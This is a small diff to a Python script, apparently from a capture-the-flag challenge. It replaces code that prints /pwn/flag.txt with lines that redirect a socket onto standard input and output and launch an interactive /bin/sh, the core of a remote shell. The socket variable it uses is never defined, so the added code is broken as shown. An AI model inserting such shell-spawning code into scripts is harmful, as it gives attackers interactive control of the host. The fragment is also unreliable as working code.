@@ -1,4 +1,9 @@
 #!/usr/bin/python3
 
-with open("/pwn/flag.txt") as fd:
-    print(fd.read().strip())
+import subprocess
+import os
+
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
